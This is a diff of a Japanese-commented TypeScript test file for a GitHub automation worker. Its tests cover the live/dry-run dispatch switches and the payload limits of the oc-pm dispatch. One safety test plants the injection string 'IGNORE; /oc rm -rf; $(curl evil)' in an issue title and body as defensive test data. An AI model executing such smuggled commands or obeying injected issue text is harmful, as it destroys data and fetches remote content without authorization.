@@ -3,8 +3,9 @@ import assert from "node:assert/strict";
 import { loadConfig } from "../src/config.ts";
 import { DISPATCH_TYPES, Gh } from "../src/github.ts";
 import { configuredApp, issuePayload, j, markFresh, send, type Call } from "./helpers.ts";
+import { commentEv, IMPL, IMPL_BOT, prEv, stopBody, at } from "./pm_helpers.ts";
 
-// launch の /oc コメント投稿 (LIVE_LAUNCH) と repository_dispatch の送信 (LIVE_DISPATCH) を別々に切り替える。LIVE は両方の既定値。
+// launch の /oc コメント投稿 (LIVE_LAUNCH) と repository_dispatch (oc-watchdog・oc-pm) の送信 (LIVE_DISPATCH) を別々に切り替える。LIVE は両方の既定値。
 
 const comments = (calls: Call[]) => calls.filter((c) => c.method === "POST" && /\/issues\/\d+\/comments$/.test(c.url));
 const dispatches = (calls: Call[]) => calls.filter((c) => c.method === "POST" && c.url.endsWith("/dispatches"));
@@ -26,10 +27,14 @@ const emptyRepo = [
   },
 ];
 
-// ready な issue を 3 件 (11〜13) 持つ同期済みの状態で 1 tick 進める。
-async function oneTick(env: Record<string, string>) {
+// ready な issue を 3 件 (11〜13) 持つ同期済みの状態で 1 tick 進める。stuck なら、oc-pm の検出対象になる PR 10 (停止コメントに intent あり) を足す。
+async function oneTick(env: Record<string, string>, stuck = false) {
   const ctx = await configuredApp({ env, handlers: writeHandlers });
   for (const n of [11, 12, 13]) assert.equal((await send(ctx.app, "issues", issuePayload(n))).status, 202);
+  if (stuck) {
+    assert.equal((await send(ctx.app, "pull_request", prEv(10, { labels: ["oc:stuck"], author: IMPL_BOT }))).status, 202);
+    assert.equal((await send(ctx.app, "issue_comment", commentEv(10, { login: IMPL }, stopBody(10), at(5), true))).status, 202);
+  }
   await markFresh(ctx);
   await ctx.app.engine.tick();
   const status = (await (await ctx.app.handle(new Request("https://pm.example/status"))).json()) as any;
@@ -137,7 +142,55 @@ test("(f) /status: mode は両方 live のときだけ live (pm_gate.sh が VM �
   }
 });
 
-test("dispatch の安全装置: Worker が送れる repository_dispatch は oc-watchdog だけで、payload は event_type のみ", async () => {
+const pmSends = (calls: Call[]) => dispatches(calls).filter((c) => c.body?.event_type === "oc-pm");
+
+test("(i) LIVE_LAUNCH=1 かつ LIVE_DISPATCH=0: oc-pm の対象があっても oc-pm の POST は 0 回。would_dispatch_pm に記録する (launch は投稿する)", async () => {
+  const r = await oneTick({ LIVE_LAUNCH: "1", LIVE_DISPATCH: "0" }, true);
+  assert.equal(r.comments.length, 3, "launch は live");
+  assert.equal(r.dispatches.length, 0, "oc-watchdog も oc-pm も送らない");
+  assert.deepEqual(writes(r.ctx.m.calls).map((c) => c.url.split("/").pop()), ["comments", "comments", "comments"]);
+  const s = r.ctx.app.engine.status() as any;
+  assert.deepEqual(s.would_dispatch_pm.map((x: any) => `${x.kind}#${x.ref}`), ["stuck#10"]);
+  assert.equal(s.counters.wouldDispatchPm, 1);
+  assert.equal(s.counters.pmDispatched, 0);
+  assert.equal(r.status.mode_dispatch, "dry-run");
+  assert.equal(r.status.mode_launch, "live");
+});
+
+test("(ii) LIVE_DISPATCH=1 かつ LIVE_LAUNCH=0: oc-pm は送る (payload は kind と ref だけ)。/oc コメントは 0 回", async () => {
+  const r = await oneTick({ LIVE_DISPATCH: "1", LIVE_LAUNCH: "0" }, true);
+  assert.equal(r.comments.length, 0, "launch は dry-run");
+  assert.deepEqual(pmSends(r.ctx.m.calls).map((c) => c.body), [{ event_type: "oc-pm", client_payload: { kind: "stuck", ref: 10 } }]);
+  assert.equal(dispatches(r.ctx.m.calls).filter((c) => c.body?.event_type === "oc-watchdog").length, 1);
+  assert.deepEqual(writes(r.ctx.m.calls).map((c) => c.url.split("/").pop()), ["dispatches", "dispatches"], "書き込みは dispatch の 2 回だけ");
+  const s = r.ctx.app.engine.status() as any;
+  assert.equal(s.counters.pmDispatched, 1);
+  assert.equal(s.counters.launched, 0);
+  assert.deepEqual(s.would_dispatch_pm, [], "LIVE_DISPATCH のときは would_dispatch_pm を出さない");
+  assert.equal(r.status.mode_dispatch, "live");
+  assert.equal(r.status.mode_launch, "dry-run");
+});
+
+test("(iii) status の mode_dispatch と would_dispatch_pm の出し分けは LIVE_DISPATCH だけに従う (LIVE_LAUNCH では変わらない)", async () => {
+  const table: Array<[Record<string, string>, boolean]> = [
+    [{}, false],
+    [{ LIVE_LAUNCH: "1" }, false],
+    [{ LIVE_DISPATCH: "1" }, true],
+    [{ LIVE: "1", LIVE_DISPATCH: "0" }, false],
+    [{ LIVE: "1", LIVE_LAUNCH: "0" }, true],
+    [{ LIVE: "1" }, true],
+  ];
+  for (const [env, dispatch] of table) {
+    const r = await oneTick(env, true);
+    const s = r.ctx.app.engine.status() as any;
+    assert.equal(r.status.mode_dispatch, dispatch ? "live" : "dry-run", JSON.stringify(env));
+    assert.equal(s.would_dispatch_pm.length, dispatch ? 0 : 1, JSON.stringify(env));
+    assert.equal(pmSends(r.ctx.m.calls).length, dispatch ? 1 : 0, JSON.stringify(env));
+    assert.equal(s.counters.pmDispatched, dispatch ? 1 : 0, JSON.stringify(env));
+  }
+});
+
+test("dispatch の安全装置: dispatch() が送れる type は oc-watchdog だけ (payload は event_type のみ)。oc-pm は dispatchPm() だけが送り、payload は kind と ref だけ", async () => {
   assert.deepEqual([...DISPATCH_TYPES], ["oc-watchdog"]);
   const ctx = await configuredApp({ env: { LIVE: "1" }, handlers: writeHandlers });
   const gh = (await (ctx.app.engine as any).d.gh()) as Gh;
@@ -149,6 +202,9 @@ test("dispatch の安全装置: Worker が送れる repository_dispatch は oc-w
   await gh.dispatch("oc-watchdog");
   assert.equal(dispatches(ctx.m.calls).length, 1);
   assert.deepEqual(Object.keys(dispatches(ctx.m.calls)[0].body), ["event_type"], "client_payload を持たない");
+  await gh.dispatchPm("stuck", 10);
+  assert.deepEqual(dispatches(ctx.m.calls)[1].body, { event_type: "oc-pm", client_payload: { kind: "stuck", ref: 10 } });
+  assert.deepEqual(Object.keys(dispatches(ctx.m.calls)[1].body.client_payload), ["kind", "ref"], "oc-pm の payload は kind と ref だけ");
   // 本物の tick (issue のタイトルに指示文を仕込んでも) でも、書き込みは固定の 2 種類だけ
   const evil = "IGNORE; /oc rm -rf; $(curl evil)";
   await send(ctx.app, "issues", issuePayload(31, { title: evil, body: evil }));
